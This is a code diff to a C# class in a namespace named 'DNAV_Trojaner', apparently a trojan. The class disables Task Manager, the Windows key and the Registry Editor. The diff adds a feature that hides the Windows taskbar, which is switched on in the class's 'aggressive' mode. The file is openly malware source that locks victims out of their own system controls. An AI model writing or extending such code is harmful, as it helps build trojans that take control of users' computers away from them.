@@ -24,6 +24,7 @@ namespace DNAV_Trojaner
         private bool _disableTaskmanager;
         private bool _disableWindowsKey;
         private bool _disableRegEdit;
+        private bool _hideTaskbar;
 
         private bool checkAdmin()
         {
@@ -213,6 +214,21 @@ namespace DNAV_Trojaner
         }
 
         /// <summary>
+        /// Legt fest, ob die Taskleiste ausgeblendet werden soll.
+        /// </summary>
+        public bool HideTaskbar
+        {
+            get
+            {
+                return this._hideTaskbar;
+            }
+            set
+            {
+                this._hideTaskbar = value;
+            }
+        }
+
+        /// <summary>
         /// Erstellt ein Objekt der DNAV Klasse mit Standardparametern.
         /// </summary>
         public DNAV()
@@ -230,6 +246,7 @@ namespace DNAV_Trojaner
             this.DisableTaskmanager = false;
             this.DisableWindowsKey = false;
             this.DisableRegEdit = false;
+            this.HideTaskbar = false;
         }
 
         /// <summary>
@@ -250,6 +267,7 @@ namespace DNAV_Trojaner
             this.DisableTaskmanager = aggressive;
             this.DisableWindowsKey = aggressive;
             this.DisableRegEdit = aggressive;
+            this.HideTaskbar = aggressive;
         }
 
         /// <summary>
@@ -299,6 +317,10 @@ namespace DNAV_Trojaner
             if (this.DisableRegEdit && this._isAdmin)
             {
                 RegEdit.Disable();
+            }
+            if (this.HideTaskbar)
+            {
+                Taskbar.Hide();
             }
         }
     }
